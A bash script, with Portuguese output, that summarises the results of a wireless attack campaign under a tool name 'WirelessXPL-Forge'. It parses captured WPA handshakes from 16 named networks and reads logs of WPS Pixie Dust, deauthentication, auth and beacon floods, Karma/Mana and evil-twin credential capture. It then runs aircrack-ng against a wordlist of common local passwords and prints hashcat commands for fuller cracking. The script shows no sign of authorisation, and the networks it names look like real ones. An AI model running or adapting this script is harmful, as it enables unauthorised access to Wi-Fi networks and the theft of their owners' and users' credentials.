#!/usr/bin/env bash
OUT=/tmp/wxf_campaign_20260503_190833
cd "$OUT"

echo "================================================================"
echo "  WirelessXPL-Forge — Análise de Handshakes e Resultados"
echo "  Data: $(date)"
echo "================================================================"
echo ""

echo "=== HANDSHAKES CAPTURADOS (16 redes) ==="
echo ""
CRACKABLE=0
for cap in *.cap; do
    echo "--- $cap ---"
    INFO=$(aircrack-ng "$cap" 2>&1 | grep -E "BSSID|ESSID|handshake|1 handshake|WPA" | head -3)
    echo "$INFO"
    if echo "$INFO" | grep -q "1 handshake"; then
        echo "  [+] HANDSHAKE VÁLIDO!"
        CRACKABLE=$((CRACKABLE+1))
    fi
done

echo ""
echo "Total handshakes válidos: $CRACKABLE"

echo ""
echo "=== WPS PIXIE DUST — 1-708 ==="
cat 07_wps_pixie_1708.txt | grep -v '^\[' | grep -E "pin|PIN|WPS|crack|PSK|password|success|fail" -i | head -20

echo ""
echo "=== WPS UNIAOGEEK ==="
cat 07_wps_uniaogeek.txt | grep -E "pin|PIN|WPS|crack|PSK|success|fail" -i | head -20

echo ""
echo "=== CONNECTIVITY #CLARO-WIFI ==="
cat 12_claro_wifi_enum.txt 2>/dev/null | grep -E "host|ip|connect|internet|gateway|DHCP" -i | head -20 || echo "sem dados"

echo ""
echo "=== AUTH FLOOD (fase 9) ==="
cat 09_auth_flood.txt | grep -E "sent|flood|count|burst" -i | head -10

echo ""
echo "=== BEACON FLOOD (fase 10) ==="
cat 10_beacon_flood.txt | grep -E "sent|ssid|flood|beacon" -i | head -10

echo ""
echo "=== KARMA/MANA (fase 13) ==="
cat 13_karma_mana.txt | grep -E "client|connect|associated|probe" -i | head -15

echo ""
echo "=== EVIL TWIN (fase 14) ==="
cat 14_evil_twin.txt | grep -E "credential|psk|password|client|connect" -i | head -15

echo ""
echo "=== WARDRIVING ==="
ls -la wardrive* 2>/dev/null
wc -l wardrive-01.csv 2>/dev/null || true

echo ""
echo "=== PMKID HASHES DISPONÍVEIS ==="
cat /tmp/pmkid_hashes.txt 2>/dev/null | wc -l
echo "hashes no arquivo /tmp/pmkid_hashes.txt"

echo ""
echo "================================================================"
echo "  TENTANDO CRACK COM HASHCAT (wordlist básica)"
echo "================================================================"
printf 'senha123\n12345678\nsenha1234\nwifi1234\nUniaoGeek\nuniaogeek\n123456789\nminhasenha\npassword1\nadmin123\nadmin\npassword\n12345\n1234567890\nminharede\ninternetbr\nclaro123\nvivo1234\ntim12345\noi123\n' > /tmp/quick_test_wl.txt

echo "Tentando crack nos handshakes..."
for cap in "$OUT"/*.cap; do
    ESSID=$(aircrack-ng "$cap" 2>&1 | grep "ESSID" | head -1)
    RESULT=$(aircrack-ng -w /tmp/quick_test_wl.txt "$cap" 2>&1 | grep -E "KEY FOUND|PASSPHRASE FOUND|KEY NOT FOUND" | head -1)
    if [ -n "$RESULT" ]; then
        NETWORK=$(basename "$cap")
        echo "[$NETWORK] $RESULT"
        if echo "$RESULT" | grep -q "KEY FOUND"; then
            echo "  [!!] SENHA ENCONTRADA: $RESULT"
        fi
    fi
done

echo ""
echo "================================================================"
echo "  RESUMO FINAL"
echo "================================================================"
echo "  Handshakes capturados: 16 redes"
echo "  PMKIDs coletados: 4+ (arquivo /tmp/pmkid_hashes.txt)"
echo "  Redes com WPS vulnerável: 1-708 (WPS 1.0 - Pixie Dust)"
echo "  Redes TKIP: Denise, VOE_AP1704, TrOll"
echo "  Redes abertas: #CLARO-WIFI (captive portal)"
echo "  Deauth executado: 16 APs"
echo "  Módulos WirelessXPL-Forge executados: 19+ fases"
echo ""
echo "  Para crack completo:"
echo "  hashcat -m 22000 /tmp/pmkid_hashes.txt /usr/share/wordlists/rockyou.txt"
echo "  aircrack-ng -w /usr/share/wordlists/rockyou.txt $OUT/*.cap"
echo "================================================================"
